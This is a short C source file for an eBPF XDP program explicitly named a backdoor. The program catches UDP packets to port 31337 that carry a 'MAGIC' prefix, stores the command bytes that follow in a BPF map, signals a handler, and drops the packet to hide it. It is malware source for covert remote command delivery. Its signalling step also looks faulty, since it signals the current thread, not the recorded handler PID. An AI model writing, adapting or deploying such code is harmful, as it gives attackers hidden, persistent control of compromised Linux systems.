#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/in.h>

#define MAGIC_PORT  31337
#define MAGIC_SZ    5
#define CMD_MAX     64
#define SIGUSR1     10

static const char MAGIC[MAGIC_SZ] = { 'M', 'A', 'G', 'I', 'C' };

struct trigger_entry {
    __u8 cmd[CMD_MAX];
    __u32 len;
    __u32 ready;
};

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, struct trigger_entry);
} trigger SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u32);
} handler_pid SEC(".maps");

SEC("xdp")
int xdp_backdoor(struct xdp_md *ctx)
{
    void *data     = (void *)(long)ctx->data;
    void *data_end = (void *)(long)ctx->data_end;

    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end) return XDP_PASS;
    if (bpf_ntohs(eth->h_proto) != ETH_P_IP) return XDP_PASS;

    struct iphdr *ip = (void *)(eth + 1);
    if ((void *)(ip + 1) > data_end) return XDP_PASS;
    if (ip->protocol != IPPROTO_UDP) return XDP_PASS;

    __u32 ip_hdr_len = ip->ihl * 4;
    struct udphdr *udp = (void *)ip + ip_hdr_len;
    if ((void *)(udp + 1) > data_end) return XDP_PASS;
    if (bpf_ntohs(udp->dest) != MAGIC_PORT) return XDP_PASS;

    __u8 *payload = (void *)(udp + 1);
    __u32 udp_data_len = bpf_ntohs(udp->len) - sizeof(*udp);
    if ((void *)(payload + MAGIC_SZ) > data_end) return XDP_PASS;

    for (int i = 0; i < MAGIC_SZ; i++)
        if (payload[i] != MAGIC[i]) return XDP_PASS;

    __u8 *cmd_start = payload + MAGIC_SZ;
    __u32 cmd_len   = udp_data_len - MAGIC_SZ;
    if (cmd_len == 0 || (void *)(cmd_start + 1) > data_end) return XDP_DROP;

    __u32 key = 0;
    struct trigger_entry *t = bpf_map_lookup_elem(&trigger, &key);
    if (!t) return XDP_DROP;

    if (t->ready) return XDP_DROP;

    __u32 to_copy = cmd_len < CMD_MAX ? cmd_len : CMD_MAX - 1;

    for (int i = 0; i < CMD_MAX; i++) {
        if ((__u32)i >= to_copy) { t->cmd[i] = 0; break; }
        if ((void *)(cmd_start + i + 1) > data_end) break;
        t->cmd[i] = cmd_start[i];
    }
    t->len   = to_copy;
    t->ready = 1;

    __u32 *pidp = bpf_map_lookup_elem(&handler_pid, &key);
    if (pidp && *pidp > 0)
        bpf_send_signal_thread(SIGUSR1);

    return XDP_DROP;
}

char LICENSE[] SEC("license") = "GPL";
